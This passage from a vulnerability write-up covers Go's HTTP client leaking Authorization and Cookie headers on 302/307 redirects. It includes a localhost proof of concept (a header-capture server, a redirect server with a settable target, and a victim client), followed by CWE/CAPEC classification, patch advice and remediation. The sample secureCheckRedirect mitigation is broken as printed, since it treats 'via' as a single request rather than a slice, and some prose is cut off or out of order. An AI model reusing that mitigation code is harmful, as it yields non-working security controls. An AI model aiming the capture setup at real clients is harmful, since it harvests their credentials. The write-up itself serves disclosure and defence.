	log.Printf(" Received request for: %s %s", r.Method, r.URL.String())
	log.Println(" Headers Received:")
	for name, headers := range r.Header {
		for _, h := range headers {
			log.Printf("   %s: %s", name, h)
		}
	}

	authHeader := r.Header.Get("Authorization")
	cookieHeader := r.Header.Get("Cookie")

	if authHeader!= "" {
		log.Println("!!! ALERT: Authorization header leaked!")
		fmt.Fprintf(w, "SUCCESS: Authorization header received: %s\n", authHeader)
	} else {
		log.Println(" Authorization header NOT found.")
		fmt.Fprintln(w, "Authorization header NOT received.")
	}
	if cookieHeader!= "" {
		log.Println("!!! ALERT: Cookie header leaked!")
	} else {
		log.Println(" Cookie header NOT found.")
	}
}

func main() {
	port := "8082"
	log.Printf(" Starting on port %s", port)
	http.HandleFunc("/target_endpoint", captureHandler)
	if err := http.ListenAndServe(":"+port, nil); err!= nil {
		log.Fatalf(" Failed to start: %v", err)
	}
}`

**2. Redirecting Server (Server A) - `redirect_server.go`**

Go

`package main

import (
	"log"
	"net/http"
)

// targetURL will be the address of the Capture Server
var targetURL = "http://localhost:8082/target_endpoint" // Default, can be overridden by query param for flexibility

func redirectHandler(w http.ResponseWriter, r *http.Request) {
	// Allow overriding redirect target via query for testing different scenarios
	customTarget := r.URL.Query().Get("redirectTo")
	currentRedirectTarget := targetURL
	if customTarget!= "" {
		currentRedirectTarget = customTarget
	}

	log.Printf(" Received request for: %s. Redirecting to %s", r.URL.String(), currentRedirectTarget)
	// Using 307 Temporary Redirect to ensure method and body are preserved by the client.
	// The vulnerability primarily concerns headers, but 307 is relevant.
	http.Redirect(w, r, currentRedirectTarget, http.StatusTemporaryRedirect)
}

func main() {
	port := "8081"
	log.Printf(" Starting on port %s", port)
	http.HandleFunc("/initial_request", redirectHandler)
	// For multi-hop test (CVE-2024-45336 style):
	// Server A redirects to Server C (cross-domain, e.g., different port or external)
	// Server C then redirects back to Server A's /final_same_domain_target or to Server B
	// http.HandleFunc("/intermediate_cross_domain_hop", func(w http.ResponseWriter, r *http.Request) {
	//     finalTarget := "http://localhost:8082/target_endpoint" // Could be Server B
	//     log.Printf(" Redirecting to %s", finalTarget)
	//     http.Redirect(w, r, finalTarget, http.StatusTemporaryRedirect)
	// })
	if err := http.ListenAndServe(":"+port, nil); err!= nil {
		log.Fatalf(" Failed to start: %v", err)
	}
}`

**3. Victim Go Application - `victim_app.go`**

Go

`package main

import (
	"fmt"
	"log"
	"net/http"
	"io/ioutil"
	"strings"
)

func main() {
	// URL of the Redirecting Server (Server A)
	initialURL := "http://localhost:8081/initial_request"
	// For CVE-2023-45289 type test, Server A redirects directly to Server B (localhost:8082)
	// For CVE-2024-45336 type test, a more complex chain is needed:
	// victim -> ServerA:/initial (redirects to ServerC_cross_domain) -> ServerC_cross_domain (redirects to ServerB_capture_or_ServerA_same_domain_final)
	// This PoC focuses on the simpler direct cross-domain redirect leak.

	client := &http.Client{
		// Using default CheckRedirect policy.
		// In a vulnerable Go version, this policy has flaws.
	}

	req, err := http.NewRequest("POST", initialURL, strings.NewReader("body=content"))
	if err!= nil {
		log.Fatalf(" Error creating request: %v", err)
	}

	// Add sensitive headers
	req.Header.Add("Authorization", "Bearer SUPER_SECRET_TOKEN_XYZ")
	req.Header.Add("Cookie", "sessionid=sensitive_session_data_123")
	req.Header.Add("X-Custom-Secret", "my_app_specific_secret")

	log.Printf(" Making POST request to %s with sensitive headers.", initialURL)
	resp, err := client.Do(req)
	if err!= nil {
		log.Fatalf(" Error performing request: %v", err)
	}
	defer resp.Body.Close()

	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	log.Printf(" Received response. Status: %s. Final URL: %s", resp.Status, resp.Request.URL.String())
	log.Printf(" Response Body from final destination:\n%s", string(bodyBytes))
	fmt.Println("----------------------------------------------------")
	fmt.Println("Test complete. Check logs of Capture Server (localhost:8082).")
	fmt.Println("If 'Authorization' or 'Cookie' headers are present in Capture Server logs, the leak is confirmed.")
	fmt.Println("----------------------------------------------------")
}`
```

**Execution Steps:**

1. **Compile and Run Servers**:
    - Open a terminal, navigate to the directory with `capture_server.go`, and run:
    `go run capture_server.go`
    - Open another terminal, navigate to `redirect_server.go`, and run:
    `go run redirect_server.go`
    (Ensure you are using a vulnerable Go version for compiling these if you want them to *also* be vulnerable in some hypothetical chained scenario, but for this PoC, their Go version is less critical than the victim_app's).
2. **Compile and Run Victim Application**:
    - Open a third terminal, navigate to `victim_app.go`. **Crucially, ensure this `go run` command uses a Go toolchain version known to be vulnerable (e.g., Go 1.21.7 for CVE-2023-45289).**`go run victim_app.go`

**Expected Outcome (Vulnerable Scenario):**

- The **Victim App** will make a POST request to `http://localhost:8081/initial_request`.
- The **Redirect Server (Server A)** logs will show it received the request and is redirecting to `http://localhost:8082/target_endpoint`.
- The **Capture Server (Server B)** logs will show it received a request. Critically, these logs will include:

```
!!! ALERT: Authorization header leaked!
Authorization: Bearer SUPER_SECRET_TOKEN_XYZ
!!! ALERT: Cookie header leaked!
Cookie: sessionid=sensitive_session_data_123
X-Custom-Secret: my_app_specific_secret
```
The presence of "Authorization" and "Cookie" (and "X-Custom-Secret") headers at the Capture Server, which is on a different port (simulating cross-domain), confirms the leak.

**Expected Outcome (Patched/Secure Scenario):**

If `victim_app.go` is compiled and run with a patched Go version (e.g., Go 1.22.1 or later for CVE-2023-45289):

- The **Capture Server (Server B)** logs should show:

(The `X-Custom-Secret` might still be forwarded if not explicitly recognized as sensitive by default policies, highlighting the need for careful custom `CheckRedirect` for non-standard sensitive headers).
    
    `Authorization header NOT found.
    Cookie header NOT found.`
    

This PoC clearly demonstrates the conditions under which the sensitive header leakage occurs due to flaws in Go's default HTTP client redirect handling in unpatched versions. The key is the behavior of the `victim_app.go` when it processes the redirect issued by `redirect_server.go` and makes the subsequent request to `capture_server.go`.

## Risk Classification

The "HTTP 307/302 redirect leaks secrets" vulnerability in Golang's `net/http.Client` can be classified using several industry-standard frameworks to understand its risk profile.

**OWASP Top 10 CI/CD Security Risks**:
While this vulnerability is primarily an application-level flaw in a library, its impact can extend to CI/CD environments if Go-based tools or scripts performing HTTP client operations are part of the pipeline. In such contexts, it could tangentially relate to:

- **CICD-SEC-07: Insecure System Configuration**: If a CI/CD component built with a vulnerable Go version is deployed without patching, it represents an insecure system configuration. The component itself is improperly configured due to the unpatched library.

**OWASP Application Security Verification Standard (ASVS)**:
The ASVS provides a basis for testing web application technical security controls. This vulnerability relates to several ASVS requirements :

- **V5.2.4 (Data-in-Transit Encryption)**: "Verify that sensitive data in transit is encrypted using strong, validated, and up-to-date cryptographic protocols and algorithms." While the vulnerability doesn't break encryption directly, leaking Authorization or Cookie headers to an unintended party circumvents the protection that encryption is supposed to provide for those sensitive headers during transit to the *intended* party.
- **V14.2.1 (External System Interaction Security)**: "Verify that all interactions with external systems, services and components are done over an authenticated and encrypted channel, and that all data exchanged is validated." The leakage of authentication headers to an incorrect external system undermines the "authenticated channel" aspect for those leaked credentials.

**CWE (Common Weakness Enumeration)**:
CWE provides a community-developed list of common software and hardware weakness types.

- **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor**: This is a primary classification. The vulnerability directly leads to sensitive information (credentials, session cookies in headers) being exposed to an entity not authorized to receive it.
- **CWE-522: Insufficiently Protected Credentials**: This applies specifically when `Authorization` headers containing credentials (like API keys or tokens) are leaked due. The mechanism of leakage (flawed redirect handling) results in the credentials not being sufficiently protected during the HTTP transaction lifecycle.
- **CWE-294: Authentication Bypass by Capture-replay**: While the vulnerability itself is information exposure, the leaked credentials can subsequently be used by an attacker to bypass authentication by replaying them. This is a common consequence of credential leakage.
- **CWE-384: Session Fixation**: If session cookies are leaked and can be used by an attacker to impersonate a user, it can be related to session vulnerabilities. While not direct session fixation, the outcome (session compromise) is similar.

**CAPEC (Common Attack Pattern Enumeration and Classification)**:
CAPEC describes common attack patterns.

- **CAPEC-60: Reusing Session IDs (aka Session Replay)**: If session cookies are leaked via the `Cookie` header, attackers can reuse these session IDs to hijack legitimate user sessions.
- **CAPEC-102: Session Sidejacking**: If the redirect leads to an unencrypted (HTTP) endpoint and sensitive headers are forwarded, this could facilitate session sidejacking, although the core vulnerability is about forwarding to the wrong *domain*, not necessarily an unencrypted one. The primary risk here is the client sending credentials to an *unintended* server, regardless of that server's HTTPS status.
- **CAPEC-555: Remote Services with Stolen Credentials**: If API keys or other service credentials are leaked, attackers can use them to access remote services illicitly. This pattern describes the subsequent actions taken with the stolen credentials.

The risk associated with this vulnerability is not solely the initial information leak (CWE-200). It significantly stems from the potential subsequent actions an attacker can perform with the exfiltrated sensitive headers. For example, a leaked `Authorization` token (CWE-522) can be used to impersonate a service or user, leading to unauthorized data access or modification (CAPEC-555). Similarly, a leaked session `Cookie` can enable session hijacking (CAPEC-60). This chained nature of risk, from initial exposure to subsequent exploitation, underscores its severity. The classification highlights that the vulnerability serves as an entry point for more impactful attacks.

## Fix & Patch Guidance

Addressing the "HTTP 307/302 redirect leaks secrets" vulnerability in Golang's `net/http.Client` requires a multi-layered approach, prioritizing official patches and supplementing with code-level mitigations where necessary.

**1. Primary Fix: Upgrade Go Version**
The most effective and recommended solution is to upgrade the Go toolchain to a version that includes official patches for the identified vulnerabilities.

- **For CVE-2023-45289**: Upgrade to Go version 1.21.8 or later, or Go version 1.22.1 or later.
- **For CVE-2024-45336** (related to Go issue 70530): Upgrade to Go version 1.23.5 or later (for the 1.23.x series), or Go version 1.22.11 or later (for the 1.22.x series).
Developers should consult the official Go release notes and security advisories for the most current patching information for their specific Go minor version stream. Recompiling the application with a patched Go version will ensure the `net/http.Client` incorporates the corrected redirect handling logic.

**2. Code-Level Mitigation: Implement a Custom `CheckRedirect` Function**
If an immediate upgrade to a patched Go version is not feasible, or as a defense-in-depth measure, developers can implement a custom `CheckRedirect` function for their `http.Client` instances. This function provides explicit control over redirect behavior and header management.

- **Core Logic for a Secure Custom `CheckRedirect`**:
    - **Strict Redirect Limits**: Enforce a reasonable maximum number of redirects (e.g., the default 10, or fewer if appropriate for the application's use cases) to prevent redirect loops.
    - **Sensitive Header Stripping**: Before allowing *any* redirect, especially to a different domain or a domain not explicitly trusted, the function must proactively remove all potentially sensitive headers from the `req` argument (the upcoming request). This includes standard headers like "Authorization", "Cookie", "WWW-Authenticate", and any application-specific custom headers known to carry sensitive data.
    - **Domain Trust Policy**: Implement a clear and robust policy for determining which domains are trusted. This might involve:
        - Comparing the scheme and host of the original request (from the `via` slice) with the upcoming request's URL (`req.URL`).
        - Using an allowlist of known, trusted domains to which sensitive headers *may* be forwarded (with extreme caution).
        - Employing robust eTLD+1 matching for more accurate "same-domain" or "subdomain" checks, rather than simple string suffix matching, which can be error-prone.
    - **Prohibit Untrusted Redirects**: If a redirect target is deemed untrusted and the original request contained sensitive information, the `CheckRedirect` function should return an error (e.g., `http.ErrUseLastResponse` or a custom error) to prevent the redirect and the potential leak.
- **Example Conceptual Logic for `secureCheckRedirect`**:Go
    
    ```go
    import (
        "errors"
        "net/http"
        "net/url"
        "strings"
    )
    
    // isTrustedDomain checks if the target domain is trusted relative to the original.
    // This is a simplified example. A production implementation needs robust eTLD+1 checking
    // and potentially an allowlist.
    func isTrustedDomain(targetURL *url.URL, originalURL *url.URL) bool {
        if targetURL.Hostname() == originalURL.Hostname() {
            return true // Same host
        }
        // Basic subdomain check (example.com vs. api.example.com)
        if strings.HasSuffix(targetURL.Hostname(), "."+originalURL.Hostname()) {
            return true
        }
        // Add more sophisticated checks or allowlist logic here
        return false
    }
    
    func secureCheckRedirect(req *http.Request, via*http.Request) error {
        if len(via) >= 10 {
            return errors.New("stopped after 10 redirects")
        }
    
        // Determine the original request's URL (the very first one in the chain)
        var originalRequestURL *url.URL
        if len(via) > 0 {
            originalRequestURL = via.URL
        } else {
            // This is the first redirect attempt; req.URL is the *target* of the first redirect.
            // The 'original' request that *led* to this first redirect is not directly in 'via'.
            // A more complete solution might involve wrapping the client or passing context.
            // For this example, if 'via' is empty, we conservatively assume a cross-origin context
            // unless req.URL matches a known trusted initial domain.
            // This part highlights the complexity of getting the true origin for the first redirect.
            // For simplicity, we'll assume any redirect from an unknown origin is potentially cross-domain.
            // A robust implementation would need a way to know the initial request's domain.
        }
    
        isEffectivelyCrossOrigin := true // Default to conservative stance
        if originalRequestURL!= nil {
            if req.URL.Scheme == originalRequestURL.Scheme && isTrustedDomain(req.URL, originalRequestURL) {
                 isEffectivelyCrossOrigin = false
            }
        } else if len(via) == 0 && req.Referer()!= "" {
            // Fallback: if no 'via' history, check Referer against current redirect target.
            // This is not foolproof as Referer can be absent or spoofed.
            refererURL, err := url.Parse(req.Referer())
            if err == nil && req.URL.Scheme == refererURL.Scheme && isTrustedDomain(req.URL, refererURL) {
                isEffectivelyCrossOrigin = false
            }
        }
    
        // If redirecting to what is effectively a cross-origin domain, strip sensitive headers.
        // Or, if the policy is to always strip unless explicitly same-origin and trusted.
        if isEffectivelyCrossOrigin {
            req.Header.Del("Authorization")
            req.Header.Del("Cookie")
            req.Header.Del("WWW-Authenticate")
            // Add any other custom sensitive headers used by the application
            // req.Header.Del("X-API-Key")
        }
        return nil // Proceed with the redirect (with potentially modified headers)
    }
    
    // Usage:
    // client := &http.Client{
    //     CheckRedirect: secureCheckRedirect,
    // }
    ```
    
    - **Note**: Writing a universally correct and secure `CheckRedirect` function is challenging. The logic for determining "same domain" or "trusted domain" can be complex, especially with subdomains, aliased domains, and scenarios like the multi-hop issue in CVE-2024-45336. Developers should be aware of these complexities. The `deploymenttheory/go-api-http-client/redirect_policy_template` package  provides an example of a more structured approach to custom redirect handling, which includes managing sensitive headers and redirect history.

**Considerations for Custom `CheckRedirect`**:

- The example `secureCheckRedirect` is illustrative and simplifies domain trust. Real-world implementations need more robust domain validation (e.g., eTLD+1 checks).
- Maintaining a list of explicitly sensitive headers is crucial.
- The logic must correctly handle the `via` slice to understand the full redirect chain, especially for issues like CVE-2024-45336 where the state across hops matters.

Upgrading the Go version is the most reliable fix. Custom `CheckRedirect` functions should be considered a secondary measure, implemented with thorough testing and understanding of the potential pitfalls.

## Scope and Impact

The "HTTP 307/302 redirect leaks secrets" vulnerability in Golang's `net/http.Client` has a broad scope and can lead to significant negative impacts if exploited.

**Scope**:

- **Affected Go Applications**: Any Go application that utilizes the `net/http.Client` (including the global `http.DefaultClient` or instances of `&http.Client{}`) for making outbound HTTP or HTTPS requests is potentially within scope. This is because `net/http` is the standard package for HTTP communications in Go.
- **Redirect-Following Behavior**: The vulnerability specifically applies when the HTTP client is configured to follow redirects, which is its default behavior (up to 10 redirects). Applications that disable redirects or implement a perfectly secure custom `CheckRedirect` policy might not be vulnerable to this specific flaw, but would need to ensure their custom logic is indeed robust.
- **Usage Context**: The vulnerability is relevant in any scenario where the Go application acts as an HTTP client and interacts with external or internal services that might issue redirects. This includes:
    - API clients consuming third-party or internal APIs.
    - Services within a microservice architecture communicating with each other over HTTP.
    - Web scrapers or crawlers.
    - Command-line utilities fetching web resources.
    - Any Go program that makes HTTP requests and handles responses that could include 302 or 307 redirect status codes.
- **Vulnerable Go Versions**: The scope is defined by applications compiled with Go versions unpatched for specific CVEs like CVE-2023-45289 (affecting versions prior to 1.21.8 and 1.22.1)  and CVE-2024-45336 (affecting versions prior to 1.23.5 and 1.22.11).

**Impact**:

The impact of this vulnerability primarily stems from the unauthorized disclosure of sensitive information contained in HTTP headers.

- **Confidentiality Breach**:
    - **Leakage of Authentication Credentials**: The most critical impact is the leakage of `Authorization` headers. These headers often contain highly sensitive bearer tokens (e.g., JWTs, OAuth2 access tokens), API keys, or Basic Auth credentials. Exposure of these allows an attacker to impersonate the client application or its user.
    - **Leakage of Session Cookies**: `Cookie` headers containing session identifiers can be leaked. An attacker obtaining these can hijack legitimate user sessions, gaining the same access and privileges as the victim.
    - **Leakage of Other Sensitive Data**: Custom headers carrying other forms of sensitive information (e.g., CSRF tokens, internal identifiers) could also be exposed if not properly handled.
- **Consequences of Credential/Session Compromise**:
    - **Unauthorized Access to Systems and Data**: Attackers can use the leaked credentials or session tokens to gain unauthorized access to APIs, applications, databases, and other protected resources.
    - **Data Exfiltration**: Once access is gained, attackers can steal, view, or exfiltrate sensitive or proprietary data.
    - **Unauthorized Actions/Transactions**: Attackers may perform malicious actions, such as modifying data, executing unauthorized transactions, or disrupting services, all while appearing as the legitimate user or service.
    - **Privilege Escalation**: If the leaked credentials belong to an account with elevated privileges, the attacker could gain significant control over systems.
    - **Account Takeover**: Complete takeover of user or service accounts.
- **Broader Implications**:
    - **Loss of Trust and Reputation**: Security breaches resulting from such leaks can severely damage the reputation of the affected application, service, or organization. Users and customers may lose trust in the security of their data.
    - **Financial Loss**: The direct and indirect costs associated with a breach can be substantial. This includes costs for incident response, forensic investigation, remediation, legal fees, regulatory fines (e.g., for non-compliance with data protection laws like GDPR), and potential loss of business.
    - **Regulatory Compliance Issues**: Leaking sensitive personal or financial data can lead to violations of data privacy and protection regulations.

The impact is particularly magnified in environments with extensive inter-service communication via APIs, such as microservice architectures. In such systems, many services might be making outbound HTTP calls, increasing the potential attack surface if they are all built with a vulnerable Go version. A single leaked token from one service could potentially grant access to multiple other services if token scopes are not strictly limited or if tokens are reused across services. The severity of the impact is directly proportional to the sensitivity of the leaked headers and the permissions associated with the compromised credentials or sessions.

## Remediation Recommendation

A comprehensive remediation strategy for the "HTTP 307/302 redirect leaks secrets" vulnerability in Golang's `net/http.Client` involves prompt patching, defensive coding practices, and broader security hygiene for API interactions.

1. **Primary Recommendation: Upgrade Go Version**
    - **Action**: The most critical and effective step is to upgrade the Go toolchain to a version that includes the official security patches for the relevant CVEs.
        - For CVE-2023-45289: Upgrade to Go 1.21.8 or later, or Go 1.22.1 or later.
        - For CVE-2024-45336 (Go issue 70530): Upgrade to Go 1.23.5 or later, or Go 1.22.11 or later.
    - **Rationale**: Official patches from the Go team address the root cause of the vulnerability within the standard library's `net/http.Client` implementation. This is the most robust and maintainable solution.
    - **Process**: Recompile and redeploy all affected Go applications and services using the patched Go version.
2. **Secondary Recommendation (Defense-in-Depth / Temporary Mitigation): Implement Strict Custom `CheckRedirect` Policy**
    - **Action**: If an immediate Go version upgrade is not possible, or as an additional security layer, implement a custom `CheckRedirect` function for all `http.Client` instances that handle potentially sensitive requests.
    - **Policy Guidelines for Custom `CheckRedirect`**:
        - **Explicitly Strip Sensitive Headers**: By default, remove all known sensitive headers (e.g., `Authorization`, `Cookie`, `WWW-Authenticate`, `X-API-Key`, and any application-specific sensitive headers) from the `req` object before allowing any redirect, especially to a different domain or an untrusted target.
        - **Strict Domain Trust Model**: Implement a robust mechanism to determine if a redirect target is trusted. This should go beyond simple hostname comparison and ideally use eTLD+1 matching to correctly identify same-origin vs. cross-origin redirects. Consider an allowlist of explicitly trusted domains for forwarding any headers, if absolutely necessary.
        - **Limit Redirects**: Enforce a maximum number of redirects (e.g., 5-10) to prevent denial-of-service through redirect loops.
        - **Disallow Redirects for Highly Sensitive Operations**: For API calls known to carry extremely sensitive information where redirects are unexpected, consider disallowing redirects entirely by returning `http.ErrUseLastResponse` or a custom error.
        - **Leverage Existing Libraries**: If building complex redirect logic from scratch is too error-prone, consider using or adapting well-vetted third-party libraries or templates designed for secure redirect handling, such as the concepts demonstrated in `deploymenttheory/go-api-http-client/redirect_policy_template` , which includes features for managing sensitive headers and redirect history.
    - **Caution**: Implementing a custom `CheckRedirect` function correctly is non-trivial. Flaws in custom logic can introduce new vulnerabilities or fail to mitigate the original ones. This approach requires careful design and thorough testing.
3. **Security Best Practices for API Interaction and Token Management**:
These practices limit the impact even if a leak occurs due to an unknown vulnerability or misconfiguration.
    - **Principle of Least Privilege for Tokens**: Ensure that API keys, bearer tokens, and session cookies have the minimum necessary permissions (scopes) required for their intended purpose. Avoid using overly permissive or global tokens.
    - **Short-Lived Tokens**: Use tokens with short expiration times. This reduces the window of opportunity for an attacker to abuse a leaked token. Implement robust token refresh mechanisms where appropriate.
    - **Token Binding**: Where feasible (e.g., with certain OAuth flows), bind tokens to specific client characteristics (e.g., client certificates, IP addresses if stable) to make stolen tokens harder to use by an attacker.
    - **HTTPS Everywhere**: Ensure that all HTTP communications, including all hops in a redirect chain, use HTTPS. While this doesn't prevent the specific Go client vulnerability (which can leak headers even between HTTPS sites), it prevents eavesdropping on the wire and protects against downgrade attacks.
    - **Monitoring and Alerting for Token Misuse**: Implement monitoring on the server-side to detect anomalous usage patterns of API keys or session tokens, which might indicate a compromise.
4. **Regular Security Audits and Testing**:
    - **Code Audits**: Regularly audit Go code, especially parts involving HTTP client interactions and custom `CheckRedirect` implementations.
    - **Penetration Testing**: Conduct penetration tests that specifically target redirect handling and potential header leakage scenarios. Use dynamic analysis techniques as described in the "Detection Steps" section.
    - **Dependency Monitoring**: Continuously monitor Go versions and third-party dependencies for new vulnerabilities using tools like `govulncheck`.

The primary remediation should always be to apply official patches by upgrading the Go version. Custom logic and security best practices serve as important secondary controls to provide defense-in-depth and mitigate risks from both known and potentially unknown vulnerabilities.

## Summary

The Golang "HTTP 307/302 redirect leaks secrets" vulnerability, also known by aliases such as "redirect-secret-leak," represents a critical security flaw within Go's standard `net/http.Client`. This issue arises when the client, while processing HTTP 302 (Found) or 307 (Temporary Redirect) responses, incorrectly forwards sensitive HTTP headers—most notably `Authorization` (containing credentials like bearer tokens or API keys) and `Cookie` (containing session identifiers)—to unintended or malicious destinations.

The vulnerability is not due to a complete absence of a security policy within the Go HTTP client; rather, it stems from subtle but significant flaws in the implementation of its redirect-following logic. Specifically, the client's mechanisms for stripping or forwarding sensitive headers based on domain-matching rules (distinguishing between same-domain, subdomain, and cross-domain redirects) have been found to be fallible under certain conditions. This has been evidenced by specific vulnerabilities such as CVE-2023-45289, which highlighted issues with forwarding headers to non-subdomain/exact match targets, potentially exacerbated by maliciously crafted redirects or complex domain characteristics like IPv6 zone IDs. Furthermore, CVE-2024-45336 demonstrated that sensitive headers could be incorrectly restored and sent during multi-hop redirect chains involving an initial cross-domain redirect followed by a same-domain redirect.

The primary risk associated with this vulnerability is the exposure of highly sensitive credentials. If an attacker can induce a vulnerable Go application to follow a crafted redirect, they can potentially intercept these headers, leading to severe consequences such as unauthorized access to APIs and services, session hijacking, data exfiltration, and other forms of account compromise. The impact can be particularly severe in microservice architectures or systems heavily reliant on token-based authentication for inter-service communication.

Key remediation strategies focus on upgrading the Go toolchain to patched versions that address these specific CVEs. This is the most comprehensive and recommended solution. As a secondary or temporary measure, developers can implement robust custom `CheckRedirect` functions within their `http.Client` configurations to enforce stricter header stripping policies and control redirect behavior explicitly. However, crafting such custom policies requires careful consideration of complex redirect scenarios and domain-matching logic to avoid introducing new flaws. Adopting security best practices, such as using short-lived tokens with least privilege and ensuring HTTPS for all communications, further mitigates the potential impact of any credential leakage.

The subtle nature of these bugs, often manifesting in edge cases of domain matching or the state management of redirect chains, underscores the complexity of secure HTTP client implementation. It highlights the ongoing need for vigilance in software supply chain security, prompt patching, and the adoption of defense-in-depth security controls when handling sensitive information in networked applications.

## References

- Go Standard Library, `net/http` Client Documentation. Relevant discussions on client behavior, redirects, and `CheckRedirect`. ()
- CVE-2023-45289: Details on incorrect forwarding of sensitive headers. ()
- CVE-2024-45336 (Go Issue 70530): Details on incorrect restoration of sensitive headers in multi-hop redirects. ()
- RFC 7231: Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content. (Defines 302 Found, 307 Temporary Redirect). ()
- RFC 1945: Hypertext Transfer Protocol -- HTTP/1.0. (Original definition of 302 Moved Temporarily). ()
- Go Security Announcements:
    - `golang-announce` mailing list post for Go 1.22.1 and 1.21.8 (fixing CVE-2023-45289 and others). (Referenced by )
    - `oss-security` mailing list post for Go 1.23.5 and 1.22.11 (fixing CVE-2024-45336 and others). ()
- `deploymenttheory/go-api-http-client/redirect_policy_template`: GitHub repository providing a template for custom redirect handling. ()
- Wallarm: "What is API Token Leakage and How to Prevent It". Discusses impact of token leaks. ()
- Scrapy Security Advisory GHSA-cw9j-q3vf-hrrv: Example of Authorization header leak in another project. ()
- FIRST.org: CVSS v3.1 Specification Document. ()
- Helm Docs (Medcrypt): Understand the CVSS Vulnerability Scoring System. ()
- Wikipedia: Common Vulnerability Scoring System. ()
- MITRE CWE:
    - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor. ()
    - CWE-522: Insufficiently Protected Credentials. ()
    - CWE-294: Authentication Bypass by Capture-replay. ()
- MITRE CAPEC:
    - CAPEC-60: Reusing Session IDs (aka Session Replay). ()
- Go Vulnerability Management - `govulncheck`. ()